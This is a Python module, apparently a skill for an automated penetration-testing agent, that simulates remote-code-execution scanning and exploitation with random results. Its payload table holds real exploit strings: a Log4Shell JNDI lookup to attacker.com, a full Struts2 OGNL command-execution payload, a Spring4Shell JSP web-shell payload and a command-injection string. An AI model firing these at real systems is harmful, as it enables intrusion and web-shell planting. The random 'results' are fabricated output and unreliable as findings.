# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
RCESkill - 远程代码执行技能

功能：
1. RCE漏洞检测
2. 远程代码执行利用
3. 系统访问获取
"""

import random
import time
from typing import Dict, List, Any
from .base_skill import BaseSkill


class RCESkill(BaseSkill):
    """远程代码执行技能"""
    
    def get_name(self) -> str:
        return "RCESkill"
    
    def get_description(self) -> str:
        return "检测和利用远程代码执行漏洞，获取系统访问权限"
    
    def get_category(self) -> str:
        return "exploitation"
    
    def get_difficulty(self) -> str:
        return "hard"
    
    def get_required_tools(self) -> List[str]:
        return ["nuclei", "metasploit", "custom_exploits"]
    
    def get_prerequisites(self) -> List[str]:
        return ["NmapScanSkill", "WhatWebSkill"]  # 需要先进行端口扫描和Web指纹识别
    
    def get_success_rate(self) -> float:
        """获取技能成功率"""
        return 0.60  # RCE成功率较低
    
    def get_estimated_time(self) -> str:
        """获取预估执行时间"""
        return "15-30分钟"
    
    def can_handle(self, context: Dict[str, Any]) -> bool:
        """
        判断是否能处理当前上下文
        
        条件：
        1. 有目标地址
        2. 目标有Web服务或已知漏洞
        3. 有RCE漏洞迹象或需要检测
        4. 尚未进行RCE利用或需要深度利用
        """
        if not context:
            return False
        
        target = context.get("target", "")
        if not target:
            return False
        
        # 检查是否有Web服务或已知服务
        has_service = False
        scan_results = context.get("scan_results", {})
        current_state = context.get("current_state", {})
        
        # 检查Web服务
        if "web_technologies" in current_state:
            has_service = True
        elif "whatweb" in scan_results:
            has_service = True
        elif "open_ports" in current_state:
            for port_info in current_state["open_ports"]:
                if isinstance(port_info, dict):
                    service = port_info.get("service", "").lower()
                    if service and service != "unknown":
                        has_service = True
                        break
        
        if not has_service:
            return False
        
        # 检查是否有RCE漏洞迹象
        has_rce_indication = False
        
        # 检查扫描结果中的RCE漏洞
        if "nuclei" in scan_results:
            nuclei_data = scan_results["nuclei"]
            if isinstance(nuclei_data, dict) and "vulnerabilities" in nuclei_data:
                for vuln in nuclei_data["vulnerabilities"]:
                    if isinstance(vuln, dict):
                        vuln_name = vuln.get("name", "").lower()
                        if any(keyword in vuln_name for keyword in ["rce", "remote code execution", "command injection", "code execution"]):
                            has_rce_indication = True
                            break
        
        # 检查当前状态中的RCE漏洞
        if "rce_vulnerabilities" in current_state:
            rce_vulns = current_state["rce_vulnerabilities"]
            if isinstance(rce_vulns, list) and len(rce_vulns) > 0:
                # 检查是否已利用
                for vuln in rce_vulns:
                    if isinstance(vuln, dict) and vuln.get("exploited", False):
                        # 已利用过，可能不需要再次利用
                        return False
                # 有漏洞但未利用，可以处理
                return True
        
        # 检查技术栈中是否有已知的易受攻击组件
        if "web_technologies" in current_state:
            tech_stack = current_state["web_technologies"]
            
            # 检查是否有已知易受攻击的组件
            vulnerable_components = [
                "Log4j", "Apache Struts", "Spring Framework", 
                "ThinkPHP", "WordPress", "Joomla"
            ]
            
            for component in vulnerable_components:
                if any(component.lower() in str(tech).lower() for tech in tech_stack.get("cms", [])):
                    has_rce_indication = True
                    break
                
                if any(component.lower() in str(tech).lower() for tech in tech_stack.get("framework", [])):
                    has_rce_indication = True
                    break
        
        return has_rce_indication
    
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行RCE漏洞检测和利用
        
        模拟执行，实际环境中应调用真实工具
        """
        target = context.get("target", "")
        
        if not target:
            return {
                "success": False,
                "error": "缺少目标地址",
                "skill_name": self.name
            }
        
        try:
            # 模拟扫描过程
            self._simulate_scanning(target)
            
            # 生成模拟结果
            scan_result = self._generate_rce_result(target, context)
            
            return {
                "success": True,
                "skill_name": self.name,
                "target": target,
                "rce_vulnerabilities": scan_result["vulnerabilities"],
                "exploitation_results": scan_result["exploitation_results"],
                "system_access": scan_result["system_access"],
                "scan_time": scan_result["scan_time"],
                "details": {
                    "tools_used": ["nuclei", "metasploit", "custom_exploits"],
                    "techniques": ["vulnerability_scanning", "exploit_development", "payload_delivery"],
                    "payloads_generated": scan_result.get("payload_count", 8)
                }
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"RCE漏洞检测失败: {str(e)}",
                "skill_name": self.name,
                "target": target
            }
    
    def _simulate_scanning(self, target: str) -> None:
        """模拟扫描过程"""
        # RCE扫描和利用通常较慢
        scan_time = random.uniform(8.0, 20.0)
        time.sleep(min(scan_time, 1.5))  # 实际等待时间缩短
    
    def _generate_rce_result(self, target: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """生成模拟的RCE扫描结果"""
        
        # 从上下文获取技术栈信息
        tech_stack = {}
        current_state = context.get("current_state", {})
        
        if "web_technologies" in current_state:
            tech_stack = current_state["web_technologies"]
        
        # 确定可能的漏洞类型
        vulnerability_type = self._determine_vulnerability_type(tech_stack, context)
        
        # 生成漏洞信息
        vulnerabilities = self._generate_vulnerabilities(target, vulnerability_type)
        
        # 生成利用结果
        exploitation_results = self._generate_exploitation_results(vulnerabilities)
        
        # 生成系统访问信息
        system_access = self._generate_system_access(exploitation_results)
        
        return {
            "vulnerabilities": vulnerabilities,
            "exploitation_results": exploitation_results,
            "system_access": system_access,
            "payload_count": random.randint(5, 15),
            "scan_time": f"{random.uniform(7.5, 18.2):.1f} seconds"
        }
    
    def _determine_vulnerability_type(self, tech_stack: Dict[str, Any], context: Dict[str, Any]) -> str:
        """确定漏洞类型"""
        
        # 从技术栈推断
        if tech_stack:
            cms = tech_stack.get("cms", [])
            framework = tech_stack.get("framework", [])
            server = tech_stack.get("server", [])
            
            # 检查已知易受攻击的组件
            tech_str = str(cms + framework + server).lower()
            
            if "log4j" in tech_str or "log4shell" in tech_str:
                return "Log4Shell (CVE-2021-44228)"
            elif "struts" in tech_str:
                return "Apache Struts RCE"
            elif "spring" in tech_str:
                return "Spring Framework RCE"
            elif "thinkphp" in tech_str:
                return "ThinkPHP RCE"
            elif "wordpress" in tech_str:
                return "WordPress Plugin RCE"
            elif "joomla" in tech_str:
                return "Joomla Component RCE"
        
        # 从扫描结果推断
        scan_results = context.get("scan_results", {})
        if "nuclei" in scan_results:
            nuclei_data = scan_results["nuclei"]
            if isinstance(nuclei_data, dict) and "vulnerabilities" in nuclei_data:
                for vuln in nuclei_data["vulnerabilities"]:
                    if isinstance(vuln, dict):
                        vuln_name = vuln.get("name", "").lower()
                        if "log4j" in vuln_name:
                            return "Log4Shell (CVE-2021-44228)"
                        elif "struts" in vuln_name:
                            return "Apache Struts RCE"
                        elif "spring" in vuln_name:
                            return "Spring Framework RCE"
        
        # 默认返回通用RCE
        return "Generic Command Injection"
    
    def _generate_vulnerabilities(self, target: str, vuln_type: str) -> List[Dict[str, Any]]:
        """生成漏洞信息"""
        
        vulnerabilities = []
        
        # 根据漏洞类型生成不同的漏洞
        if "Log4Shell" in vuln_type:
            vulnerabilities.append({
                "name": "Log4Shell (CVE-2021-44228)",
                "type": "log4j_rce",
                "severity": "critical",
                "cvss_score": 10.0,
                "description": "Apache Log4j2 JNDI注入漏洞，允许远程代码执行",
                "affected_component": "Log4j 2.x",
                "endpoint": f"{target}/api/v1/log",
                "parameter": "log_message",
                "detection_method": "JNDI lookup payload",
                "exploitable": True
            })
        
        elif "Struts" in vuln_type:
            vulnerabilities.append({
                "name": "Apache Struts RCE (CVE-2017-5638)",
                "type": "struts_rce",
                "severity": "critical",
                "cvss_score": 10.0,
                "description": "Apache Struts2 Jakarta Multipart parser漏洞，允许远程代码执行",
                "affected_component": "Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10",
                "endpoint": f"{target}/struts2-showcase/",
                "parameter": "Content-Type",
                "detection_method": "OGNL expression injection",
                "exploitable": True
            })
        
        elif "Spring" in vuln_type:
            vulnerabilities.append({
                "name": "Spring Framework RCE (CVE-2022-22965)",
                "type": "spring_rce",
                "severity": "critical",
                "cvss_score": 9.8,
                "description": "Spring Framework远程代码执行漏洞",
                "affected_component": "Spring Framework 5.3.0 - 5.3.17, 5.2.0 - 5.2.19",
                "endpoint": f"{target}/api/users",
                "parameter": "class.module.classLoader",
                "detection_method": "ClassLoader manipulation",
                "exploitable": True
            })
        
        else:
            # 通用命令注入漏洞
            vulnerabilities.append({
                "name": "Command Injection Vulnerability",
                "type": "command_injection",
                "severity": "high",
                "cvss_score": 8.8,
                "description": "Web应用命令注入漏洞，允许执行系统命令",
                "affected_component": "Web application input validation",
                "endpoint": f"{target}/api/execute",
                "parameter": "command",
                "detection_method": "OS command injection testing",
                "exploitable": random.random() > 0.4  # 60%概率可被利用
            })
        
        return vulnerabilities
    
    def _generate_exploitation_results(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """生成利用结果"""
        
        exploitation_results = []
        
        for vuln in vulnerabilities:
            if vuln.get("exploitable", False):
                # 模拟利用尝试
                exploit_success = random.random() > 0.3  # 70%成功率
                
                exploitation_result = {
                    "vulnerability": vuln["name"],
                    "exploit_attempted": True,
                    "exploit_successful": exploit_success,
                    "exploit_tool": random.choice(["metasploit", "custom_exploit", "nuclei"]),
                    "payload_used": self._generate_payload(vuln["type"]),
                    "execution_time": f"{random.uniform(2.5, 8.7):.1f} seconds"
                }
                
                if exploit_success:
                    exploitation_result["exploitation_details"] = {
                        "shell_obtained": True,
                        "privilege_level": random.choice(["user", "administrator", "root"]),
                        "session_id": f"sess_{random.randint(1000, 9999)}",
                        "access_method": "reverse shell" if random.random() > 0.5 else "web shell"
                    }
                else:
                    exploitation_result["exploitation_details"] = {
                        "failure_reason": random.choice([
                            "Exploit failed due to target patching",
                            "Payload blocked by WAF/IDS",
                            "Network connectivity issues",
                            "Target environment mismatch"
                        ])
                    }
                
                exploitation_results.append(exploitation_result)
        
        return exploitation_results
    
    def _generate_payload(self, vuln_type: str) -> str:
        """生成payload"""
        
        payloads = {
            "log4j_rce": "${jndi:ldap://attacker.com/Exploit}",
            "struts_rce": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
            "spring_rce": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
            "command_injection": "; whoami; echo 'RCE成功';"
        }
        
        return payloads.get(vuln_type, "whoami")
    
    def _generate_system_access(self, exploitation_results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成系统访问信息"""
        
        # 检查是否有成功的利用
        successful_exploits = [r for r in exploitation_results if r.get("exploit_successful", False)]
        
        if not successful_exploits:
            return {
                "access_obtained": False,
                "reason": "所有利用尝试均失败"
            }
        
        # 选择第一个成功的利用
        exploit = successful_exploits[0]
        details = exploit.get("exploitation_details", {})
        
        # 生成系统信息
        os_type = random.choice(["Linux", "Windows", "Unix"])
        
        if os_type == "Linux":
            system_info = {
                "os": "Linux",
                "distribution": random.choice(["Ubuntu 20.04", "CentOS 7", "Debian 10", "Kali Linux"]),
                "kernel": f"{random.randint(3, 5)}.{random.randint(0, 19)}.{random.randint(0, 100)}",
                "architecture": random.choice(["x86_64", "amd64"]),
                "hostname": f"server-{random.randint(1, 100)}"
            }
        elif os_type == "Windows":
            system_info = {
                "os": "Windows",
                "version": random.choice(["Windows 10", "Windows Server 2019", "Windows Server 2016"]),
                "build": f"{random.randint(15000, 20000)}",
                "architecture": random.choice(["x64", "x86"]),
                "hostname": f"WIN-{random.randint(1000, 9999)}"
            }
        else:
            system_info = {
                "os": "Unix",
                "version": random.choice(["Solaris 11", "FreeBSD 13", "OpenBSD 7"]),
                "architecture": random.choice(["sparc", "x86_64"]),
                "hostname": f"unix-{random.randint(1, 100)}"
            }
        
        # 用户信息
        user_info = {
            "username": random.choice(["www-data", "apache", "nginx", "administrator", "root"]),
            "user_id": random.randint(1000, 9999),
            "group": random.choice(["www-data", "users", "administrators"]),
            "home_directory": random.choice(["/home/www-data", "/var/www", "C:\\Users\\Administrator"])
        }
        
        # 网络信息
        network_info = {
            "ip_address": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "network_interfaces": random.randint(1, 4),
            "open_ports_local": random.sample([22, 80, 443, 3306, 3389], random.randint(2, 4))
        }
        
        # 文件系统信息
        filesystem_info = {
            "total_disk_space_gb": random.randint(50, 1000),
            "free_disk_space_gb": random.randint(10, 500),
            "mount_points": random.sample(["/", "/home", "/var", "C:\\", "D:\\"], random.randint(2, 4))
        }
        
        return {
            "access_obtained": True,
            "access_level": details.get("privilege_level", "user"),
            "session_id": details.get("session_id", "unknown"),
            "access_method": details.get("access_method", "unknown"),
            "system_info": system_info,
            "user_info": user_info,
            "network_info": network_info,
            "filesystem_info": filesystem_info,
            "recommended_next_steps": ["privilege_escalation", "lateral_movement", "data_exfiltration"]
        }
    
    def _extract_from_existing_scan(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        从现有扫描结果中提取RCE信息
        """
        if "rce" not in scan_results and "metasploit" not in scan_results:
            return {}
        
        result = {
            "vulnerabilities": [],
            "exploitation_results": [],
            "system_access": {}
        }
        
        # 提取漏洞信息
        if "nuclei" in scan_results:
            nuclei_data = scan_results["nuclei"]
            if isinstance(nuclei_data, dict) and "vulnerabilities" in nuclei_data:
                for vuln in nuclei_data["vulnerabilities"]:
                    if isinstance(vuln, dict):
                        vuln_name = vuln.get("name", "").lower()
                        if any(keyword in vuln_name for keyword in ["rce", "remote code execution", "command injection"]):
                            result["vulnerabilities"].append(vuln)
        
        # 提取利用结果
        if "metasploit" in scan_results:
            msf_data = scan_results["metasploit"]
            if isinstance(msf_data, dict) and "sessions" in msf_data:
                result["exploitation_results"] = msf_data["sessions"]
        
        return result
